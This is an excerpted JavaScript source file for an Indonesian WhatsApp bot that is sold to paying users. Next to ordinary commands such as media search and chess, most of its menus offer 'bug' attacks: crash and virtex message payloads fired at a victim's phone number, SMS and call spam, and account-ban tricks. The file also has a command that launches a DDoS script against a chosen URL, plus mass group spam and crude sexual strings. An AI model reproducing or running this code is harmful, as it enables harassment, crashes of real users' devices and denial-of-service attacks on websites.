 ...
 * DILARANG JUAL SC INI DIBAWAH DASAR JB
 * Supported By Gpt Assistant 
 * Info Update Sc? Tell Me
 * No Enc 90% 10% Enc
 * Sc Bug Dilengkapi Participant
...
return ditzzBug.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
...
await ditzzBug.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
...
//=================================================//
const { ios } = require("./virtex/button.js")
//=================================================//
...
await ditzzBug.updateProfileStatus(`✳️ ZeroXV - Client By : Thezetsuboxygen || ✅ Runtime : ${uptime}`)
...
"newsletterName": 'By DitzzXploit Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": penisbengkok,
...(await prepareWAMessageMedia({ image: nulll2 }, { upload: ditzzBug.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
...
ditzzBug.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
ditzzBug.relayMessage(m.chat, freesex, {})
}
...
"footer": {
"text": "⿻  ⌜ DitzzXploit Execution Vault ⌟  ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻DitzzXploit⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
case "spesialmenu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length) //PEMBUAT JANGAN DI GANTI NAMANYA ATAU NTAR ERROR
let mydick = jinjing[randomIndex]
let itsmenu = ` 
*${ucapanWaktu} @${m.sender.split("@")[0]}*
...
┃⭔ ${prefix}kenon 62xx
┃⭔ ${prefix}unbanv1 62xx
┃⭔ ${prefix}resetcode 62xx
┃⭔ ${prefix}unbanv2 62xx
┃⭔ ${prefix}call 62xx
┃⭔ ${prefix}spamsms 62xx
┃Note: Coba Aja Siapa Tau Bisa
┗❐

┏❐ *Menu Spesial*
┃
┃⭔ ${prefix}spesialv3 62878###
┃Note: Cara Gunain Seperti Biasa Bedanya Ini Geser Contoh .spesialv3 62xxx Geser Trus Pilih Mau Yang mana
┗❐

┏❐ *Menu Spesial*
┃
┃⭔ ${prefix}spesialv2 62878###
┃Note: Cara Gunain Seperti Biasa Bedanya Ini button Contoh .spesialv2 62xxx ntar pilih mau bug yang mana
┗❐
...
┃⭔ ${prefix}bugpenis 62xxx
┃⭔ ${prefix}bijiloe 62xxx
┃⭔ ${prefix}prikitiw 62xx
┃⭔ ${prefix}bugpepek 62xx
┃⭔ ${prefix}brutal 62878###
┃⭔ ${prefix}nuklir 62xxx
...
//=================================================//
case 'sc': case 'script': {
ditzzreply(`🌤️Sc Ini Dibuat Oleh TheZetsuboXygen (ryo).
...
//======================//
case 'yts': {
  if (!text) return ditzzreply(`*Example :* ${prefix + command} judulnya`);

  await m.reply(mess.search);
  ...
  try {
    ...
    for (let i = 0; i < selectedVideos.length; i++) {
      ...
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: ditzzBug.waUploadToServer });
    ...
    await ditzzBug.relayMessage(m.chat, msg.message, {
...
return list[Math.floor(Math.random() * list.length)]
    ...
    async function video(url) {
        ...
        const { videoMessage } = await generateWAMessageContent({
            ...
            upload: ditzzBug.waUploadToServer
        });
        return videoMessage;
    }
    ...
    try {
        ...
        await ditzzBug.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
...
case 'pinterest': case 'pin': {
  ...
  await ditzzBug.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break // Dah No enc ,Baiknya apa aku Creator Kasih Sc ini Ga enc, Mau kasih Gw chip Atau Apa Pv Tele @Yangtaggasik Dan @wnnStarJoyy
//=================================================//
case 'spesialv2': {
if (!isPremium) return ditzzreply(mess.premium)
if (args.length < 1) return ditzzreply(`Example ${prefix + command} nomer`)
let bijipler = q.replace(/[^0-9]/g, 
)
let sections = [{
title: '#~ Pilih Menu Bug ~#',
highlight_label: 'Recomended',
rows: [{
title: 'Spesialv1',
description: `Display Barabug Virtex Real`, 
id: `.barabug ${bijipler}`
},
{
title: 'Spesialv2', 
description: "Display Bom Virtex", 
id: `.bom-24j ${bijipler}`
},
{
title: 'Spesialv3', 
description: "Display Murtality Virtex ", 
id: `.murtality ${bijipler}`
},
{
title: 'Spesialv4', 
description: "Display Xnuklir1 Virtex", 
id: `.bug-rom ${bijipler}`
},
{
title: 'Spesialv5', 
description: "Display Xcrash1 Virtex", 
id: `.zero-bug ${bijipler}`
},
{
title: 'Spesialv6', 
description: "Display XcrashV2 Virtex", 
id: `.bug-24j ${bijipler}`
},
{
title: 'Spesialv7', 
description: "Display Of Kehabisan Kata", 
id: `.virg4m ${bijipler}`
},
{
title: 'Spesialv8', 
description: "Display Of Kehabisan Kata", 
id: `.forces-sql ${bijipler}`
},
{
title: 'Spesialv9', 
description: "Display Of Kehabisan Kata", 
...
rows: [{
title: 'Recommend',
description: "Display Bug Campuran", 
id: `.rajabug ${bijipler}`
},
{
title: 'Bug Coba Aja', 
description: "Display Next Coba Aja", 
id: `.rajabug3 ${bijipler}`
}]
},
{
title: '#~ Bug V3 ~#', 
...
{
title: 'Bug V3', 
description: "Display Of Xbaracrash", 
id: `.xbara ${bijipler}`
},
{
title: 'Bug V3', 
description: "Display Of XbaracrashV1", 
id: `.xbara1 ${bijipler}`
},
{
title: 'Bug V3', 
description: "Display Of XbarIosunli", 
id: `.xios ${bijipler}`
},
{
title: 'Bug V3', 
description: "Display Of Bug", 
id: `.xvol ${bijipler}`
},
{
title: 'Bug V3', 
description: "Display Of Bug Crash", 
id: `.xapel ${bijipler}`
}]
}]
...
let msg = generateWAMessageFromContent(m.chat, {
 ...
 newsletterName: 'Powered By Unknow', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ditzzBug.decodeJid(ditzzBug.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`Pilih Dengan Keyakinan`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 ...
 title: '',
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: ditzzBug.waUploadToServer }))
 }),
...
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Owner\",\"title\":\"Minat Script Ini Pm Saja\",\"id\":\".owner\"}" 
}, {
...
break /* NO ENC + GESER LAGI ,SUPPORT ME PV TELE*/ /* BILAL LOL */
case "spesialv3": {
if (!isPremium) return ditzzreply(mess.premium)
if (args.length < 1) return ditzzreply(`Example ${prefix + command} nomer`)
let bijipler = q.replace(/[^0-9]/g, 
)
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/bug.jpg")}, { upload: ditzzBug.waUploadToServer })
let msg = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      ...
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Pilih Dibawah Ini Bug Maaf kalo Ada yang error masih perkembangan"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `Spesifikasi Bug Whatsapp :*
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".xvol ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"display Bug\",\"title\":\"Create\",\"id\":\".xbara ${bijipler}\"}"
                  }
                ]
              })
            },
 ...
 text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".rajabug  ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".xapel ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".rajabug3 ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".xbara1 ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".barabug ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".zero-bug ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Display Bug\",\"title\":\"Create\",\"id\":\".virg4m ${bijipler}\"}"
                  }
                ]
              })
            },
...
text: "© Powered By "+namabot2
              ...
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"display Bug wangsaff\",\"title\":\"Create\",\"id\":\".xganas ${bijipler}\"}"
                  }
                ]
              })
            }
...
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/fanz.jpg")}, { upload: ditzzBug.waUploadToServer })
...
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*barastore* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
...
await ditzzreply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await ditzzBug.relayMessage(jid, msg.message, {messageId: msg.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await ditzzreply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isDeveloper) return ditzzreply(mess.owner)
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/fanz.jpg")}, { upload: ditzzBug.waUploadToServer })
let imgqr = await prepareWAMessageMedia({ image: await global.qris}, { upload: ditzzBug.waUploadToServer })
const msg = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
...
buttons: [{                  
"name": "quick_reply", 
"buttonParamsJson": "{\"display_text\":\"Jujur aja ya bang, gw aslinya gay☺\",\"title\":\"QRIS Payment\",\"id\":\".mn\"}"
}]
})
}]
})
...
await ditzzBug.relayMessage(m.chat, msg.message, {messageId: msg.key.id})
}
break
//=================================================//
case 'chess':{
if (!m.isGroup) return ditzzreply(mess.group)
const key = m.chat;
  ditzzBug.chess = ditzzBug.chess || {};
  let chessData = ditzzBug.chess[key] || {
    gameData: null,
    fen: null,
    currentTurn: null,
    players: [],
  ...
  ditzzBug.chess[key] = chessData;
  const { gameData, fen, currentTurn, players, hasJoined } = chessData;
  const feature = args[0]?.toLowerCase();

  if (feature === 'delete') {
    delete ditzzBug.chess[key];
    return ditzz.reply(m.chat, '🏳️ *Permainan catur dihentikan.*', m);
  }

  if (feature === 'create') {
    if (gameData) {
      return ditzz.reply(m.chat, '⚠️ *Permainan sudah dimulai.*', m);
    }
    chessData.gameData = { status: 'waiting', black: null, white: null };
    return ditzz.reply(m.chat, '🎮 *Permainan catur dimulai.*\nMenunggu pemain lain untuk bergabung.', m);
  }

  if (feature === 'join') {
    const senderId = m.sender;
    if (players.includes(senderId)) {
      return ditzz.reply(m.chat, '🙅‍♂️ *Anda sudah bergabung dalam permainan ini.*', m);
    }
    if (!gameData || gameData.status !== 'waiting') {
      return ditzz.reply(m.chat, '⚠️ *Tidak ada permainan catur yang sedang menunggu.*', m);
    }
    if (players.length >= 2) {
      return ditzz.reply(m.chat, '👥 *Pemain sudah mencukupi.*\nPermainan otomatis dimulai.', m);
    }
    ...
    if (players.length === 2) {
      ...
      return ditzz.reply(m.chat, `🙌 *Pemain yang telah bergabung:*\n${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}\n\n*Hitam:* @${black.split('@')[0]}\n*Putih:* @${white.split('@')[0]}\n\nSilakan gunakan *'chess start'* untuk memulai permainan.`, m, { mentions: hasJoined });
    } else {
      return ditzz.reply(m.chat, '🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.', m);
    }
  }

  if (feature === 'start') {
    if (gameData.status !== 'ready') {
      return ditzz.reply(m.chat, '⚠️ *Tidak dapat memulai permainan. Tunggu hingga dua pemain bergabung.*', m);
    }
    ...
    if (players.length === 2) {
      ...
      try {
        await ditzzBug.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [gameData.white] });
      } catch (error) {
        const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
        await ditzzBug.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [gameData.black] });
      }
      return;
    } else {
      return ditzz.reply(m.chat, '🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.', m);
  ...
  if (args[0] && args[1]) {
    ...
    if (!gameData || gameData.status !== 'playing') {
      return ditzzBug.reply(m.chat, '⚠️ *Permainan belum dimulai.*', m);
    }
    if (currentTurn !== senderId) {
      return ditzz.reply(m.chat, `⏳ *Sekarang giliran ${chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam'} untuk bergerak.*`, m, {
        contextInfo: {
    ...
    try {
      ...
      return ditzz.reply(m.chat, '❌ *Langkah tidak valid.*', m);
    }
    ...
    const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;
    try {
      await ditzzBug.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    } catch (error) {
      const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
      await ditzzBug.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    }
    chess.deleteComment();
    return;
  }
...
Ketik *chess join* untuk bergabung dalam permainan catur yang sedang menunggu.
  ...
  return ditzz.reply(m.chat, '❓ Perintah tidak valid. Gunakan *"chess help"* untuk melihat bantuan.', m);
};
break
//=================================================//
case "addcase": {
...
ditzzreply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
}
break
...
break
case "addadmin": {
if (!text) return ditzzreply(example("username"))
if (!isDeveloper) return ditzzreply(mess.owner)
...
if (isGroup) {
orang = m.sender
await ditzzreply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
...
`
let msg = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
...
await ditzzBug.relayMessage(orang, msg.message, { 
messageId: msg.key.id 
})
}
break
case "addadmin2": {
if (!text) return ditzzreply(example("nama,6283XXX"))
if (!isDeveloper) return ditzzreply(mess.owner)
if (!args[0]) return ditzzreply(example("nama,6283XXX"))
if (!text.split(",")) return ditzzreply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return ditzzreply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return ditzzreply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await ditzzBug.onWhatsApp(ceknya)
if (!check[0].exists) return ditzzreply("Nomor Buyyer Tidak Valid!")
...
await ditzzBug.relayMessage(client, msg.message, { 
messageId: msg.key.id 
})
}
break
case "deladmin": {
if (!isDeveloper) return ditzzreply(mess.owner)
if (!args[0]) return ditzzreply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
...
if (idadmin == null) return ditzzreply("ID Admin Tidak Ditemukan!")
ditzzreply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
...
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return ditzzreply("Tidak Ada Admin Panel")
...
ditzzBug.sendText(m.chat, teks, qtoko)
}
//=================================================//
case "delcase": {
if (!isDeveloper) return ditzzreply(mess.owner);
...
var dimas = `
🕵️ Mendapatkan Target Yang Bernama Ikyy.....
`.trim()
...
ditzzreply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ditzzreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
...
ditzzreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time]`)
}
}
break
//=================================================//
...
await aipong(target)
await baklis(target, ryobug)
await bakdok(target, ryobug)
await penghitaman(target, force2)
}
await ditzzreply(`<✓> Successfully Send Bug Vip to ${bijipler} Using Bug Vip. ✅\n\n<!> Pause 30 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'xvol': {
...
await baklis(target, ryobug)
await penghitaman(target, force2)
await bakdok(target, force2)
await ngeloc(target, force2)
await ngeloc(target, force2)
await ngeloc(target, force2)
await ngeloc(target, force2)
await ngeloc(target, force)
...
await ditzzreply(`<✓> Successfully Send Bug Vip to ${bijipler} Using ${command}. ✅\n\n<!> Pause 30 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'barabug': case 'barator': {
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ditzzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
...
await ditzzreply(`<✓> Successfully Send Bug Vip to ${bijipler} Using ${command}. ✅\n\n<!> Pause 10 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'samsung-24j': {
...
for (let j = 0; j < q; j++) {
await ditzzBug.sendVideoAsSticker(m.chat, nulll2, force, { packname: 'Zero Execution Vault', author: 'TheZetsuboXygen' })
}
}
//=================================================//
break
...
console.log(util.format(err))
let e = String(err)
ditzzBug.sendMessage("628152292992@s.whatsapp.net", {text: "Hi Developer, Tolong Perbaiki Ini\n\n" + util.format(e)})
}
}
//=================================================//
